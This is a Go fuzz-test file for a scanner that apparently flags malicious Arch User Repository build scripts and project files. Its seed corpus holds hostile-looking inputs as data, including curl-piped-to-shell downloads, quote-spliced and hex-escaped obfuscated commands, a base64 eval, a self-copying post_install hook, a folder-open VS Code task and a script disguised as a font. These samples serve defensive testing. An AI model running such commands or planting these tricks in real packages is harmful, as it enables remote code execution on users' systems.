package rules

import (
	"testing"
)

// Fuzzing the rule engine is not a formality here. Every byte these functions
// see is, by construction, attacker-chosen: a PKGBUILD from a repository
// anybody can push to. A panic in the scanner is a denial of the scan, and a
// denied scan is the one case where the fail-closed design does not help —
// aurscan is called by a shell wrapper, so a crash is an exit code, not a
// SUSPICIOUS verdict.
//
// Run them:
//
//	go test ./internal/rules -run Fuzz -fuzz FuzzScan -fuzztime 60s
//
// Non-fuzzing runs execute the seed corpus only, so these stay cheap in CI.

// seeds covers the shapes the rules are built around, plus the parser edges
// that have historically been where a shell parser gives up: unterminated
// quoting, nested expansion, heredocs, and splicing.
var seeds = []string{
	"",
	"#!/bin/sh\n",
	"curl -fsSL https://example.org/i.sh | sh\n",
	"cu\"\"rl -s http://198.51.100.7/p | ba''sh\n",
	"su$'\\x64'o pacman -S --noconfirm evil\n",
	"${IFS:0:0}sudo cp x /usr/bin/\n",
	"eval \"$(echo aGVsbG8= | base64 -d)\"\n",
	"cat <<EOF >/etc/systemd/system/x.service\n[Service]\nExecStart=/opt/x\nEOF\n",
	"npm install atomic-lockfile\n",
	"bun install js-digest\n",
	"source=(\"patches::git+https://github.com/x/y.git\")\n",
	"post_install() {\n  cp \"$BASH_SOURCE\" /tmp/w\n}\n",
	// Parser edges.
	"'",
	"\"",
	"$(",
	"${",
	"<<",
	"`",
	"$((1+",
	"a() {",
	"\x00\x01\x02",
	"\xff\xfe invalid utf8",
	"echo \u202e evil \u200b\n",
}

// FuzzExtractCommands drives the shell deobfuscator directly. It must either
// return commands or an error — never panic, and never hang on a construct the
// parser accepts but cannot finish.
func FuzzExtractCommands(f *testing.F) {
	for _, s := range seeds {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, src string) {
		cmds, err := extractCommands(src)
		if err != nil {
			return
		}
		// A returned command must carry a usable line number: the rules quote
		// by line, and a zero or negative index would be a latent slice panic
		// in a rule rather than a failure here.
		for _, c := range cmds {
			if c.line < 0 {
				t.Fatalf("command %q reports line %d", c.text, c.line)
			}
		}
	})
}

// FuzzScan drives the whole rule catalog over a single-file package. This is
// the function the pipeline calls on untrusted input.
func FuzzScan(f *testing.F) {
	for _, s := range seeds {
		f.Add("PKGBUILD", s)
	}
	f.Add(".vscode/tasks.json", `{"tasks":[{"runOptions":{"runOn":"folderOpen"}}]}`)
	f.Add("public/fonts/x.woff2", "#!/usr/bin/env node\nrequire('child_process')\n")
	f.Add(".envrc", "export PATH=/tmp:$PATH\n")

	f.Fuzz(func(t *testing.T, name, content string) {
		// Path separators and traversal in a filename reach the file-identity
		// rules, which split on "/" and take path.Base — worth fuzzing, but a
		// name has to be a name.
		if name == "" {
			return
		}
		hits := Scan(map[string]string{name: content})

		// The floor is what blocks a build. It must be one of the three known
		// labels whatever the input, because callers switch on it.
		switch got := Floor(hits, false); got {
		case "", "OK", "SUSPICIOUS", "MALICIOUS":
		default:
			t.Fatalf("Floor returned %q, which no caller handles", got)
		}

		// checkIDFor is deliberately partial — an unmapped code falls back to
		// other_critical/other_warning by severity — but a code that IS mapped
		// must name something, and a fatal code must always be mapped, or a
		// non-overridable hit loses its specific label on the way to the
		// checklist.
		for _, h := range hits {
			if h.Code == "" {
				t.Fatal("hit with an empty code")
			}
			if id, ok := checkIDFor[h.Code]; ok && id == "" {
				t.Fatalf("hit %q maps to an empty check id", h.Code)
			}
			if fatalCodes[h.Code] {
				if _, ok := checkIDFor[h.Code]; !ok {
					t.Fatalf("fatal code %q has no checkIDFor mapping", h.Code)
				}
			}
			// Medium and Low are both the "info" string, so this covers all
			// four constants.
			switch h.Severity {
			case Critical, High, Medium:
			default:
				t.Fatalf("hit %q has severity %q", h.Code, h.Severity)
			}
		}
	})
}

// FuzzScanIsDeterministic guards the property the verdict cache depends on:
// the same files must produce the same hits, in the same order, every time.
// Map iteration order is randomised per run, and two of the passes iterate the
// file set directly.
func FuzzScanIsDeterministic(f *testing.F) {
	f.Add("curl -s http://198.51.100.7/x | sh\nnpm install atomic-lockfile\n")
	f.Add("#!/bin/sh\nchmod +x /usr/local/bin/x\n")

	f.Fuzz(func(t *testing.T, content string) {
		// Scan costs roughly 200ms per 64 KB, and this target runs it several
		// times per execution. Capping the input keeps the exec rate high
		// enough for the fuzzer to explore rather than crawl — determinism
		// breaks on map iteration order, which short inputs expose just as
		// well as long ones.
		if len(content) > 4096 {
			return
		}
		files := map[string]string{
			"PKGBUILD":    content,
			"a/b/x.woff2": content,
		}
		first := Scan(files)
		for i := 0; i < 2; i++ {
			again := Scan(files)
			if len(again) != len(first) {
				t.Fatalf("run %d returned %d hits, first run returned %d",
					i, len(again), len(first))
			}
			for j := range first {
				if again[j] != first[j] {
					t.Fatalf("run %d differs at hit %d:\n %+v\n %+v",
						i, j, again[j], first[j])
				}
			}
		}
	})
}
